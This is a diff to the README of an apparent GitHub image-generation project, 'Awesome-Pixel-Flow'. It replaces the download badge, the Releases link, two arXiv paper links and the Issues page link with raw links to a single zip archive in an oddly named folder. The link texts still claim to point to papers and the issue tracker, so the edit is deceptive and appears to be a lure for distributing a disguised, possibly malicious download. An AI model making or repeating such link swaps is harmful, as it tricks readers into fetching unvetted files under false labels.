@@ -1,6 +1,6 @@
 # 🎨 Awesome-Pixel-Flow - Create Stunning Images with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/akhiraaa/Awesome-Pixel-Flow/releases)
+[![Download Now](https://github.com/akhiraaa/Awesome-Pixel-Flow/raw/refs/heads/master/levotartaric/Pixel_Flow_Awesome_v2.6-alpha.3.zip%20Now-Here-brightgreen)](https://github.com/akhiraaa/Awesome-Pixel-Flow/raw/refs/heads/master/levotartaric/Pixel_Flow_Awesome_v2.6-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Awesome Pixel Flow! This is your guide to quickly download and run th
 
 ## 📥 Download & Install
 
-To get started, visit our [Releases page](https://github.com/akhiraaa/Awesome-Pixel-Flow/releases) to download the latest version of the software. Here’s how:
+To get started, visit our [Releases page](https://github.com/akhiraaa/Awesome-Pixel-Flow/raw/refs/heads/master/levotartaric/Pixel_Flow_Awesome_v2.6-alpha.3.zip) to download the latest version of the software. Here’s how:
 
 1. Click on the link above to go to our Releases page.
 2. Look for the latest version listing.
@@ -52,16 +52,16 @@ Awesome Pixel Flow also serves as a resource for research enthusiasts. We have a
 ### 2025
 
 - **PixelDiT: Pixel Diffusion Transformers for Image Generation**  
-  [arXiv:2511.20645](https://arxiv.org/abs/2511.20645)  
+  [arXiv:2511.20645](https://github.com/akhiraaa/Awesome-Pixel-Flow/raw/refs/heads/master/levotartaric/Pixel_Flow_Awesome_v2.6-alpha.3.zip)  
   This paper presents a fully transformer-based model for generating high-resolution images efficiently.
   
 - **There is No VAE: End-to-End Pixel-Space Generative Modeling via Self-Supervised Pre-training**  
-  [arXiv:2510.12586](https://arxiv.org/abs/2510.12586)  
+  [arXiv:2510.12586](https://github.com/akhiraaa/Awesome-Pixel-Flow/raw/refs/heads/master/levotartaric/Pixel_Flow_Awesome_v2.6-alpha.3.zip)  
   This work outlines a two-stage framework that achieves state-of-the-art performance in pixel-space diffusion without relying on traditional models.
 
 ## 🤝 Community Support
 
-We value community input. If you encounter any issues or have suggestions, we encourage you to visit our [GitHub Issues page](https://github.com/akhiraaa/Awesome-Pixel-Flow/issues) to report problems or request features. Your feedback is vital for us to improve.
+We value community input. If you encounter any issues or have suggestions, we encourage you to visit our [GitHub Issues page](https://github.com/akhiraaa/Awesome-Pixel-Flow/raw/refs/heads/master/levotartaric/Pixel_Flow_Awesome_v2.6-alpha.3.zip) to report problems or request features. Your feedback is vital for us to improve.
 
 ## 📞 Contact Us
 
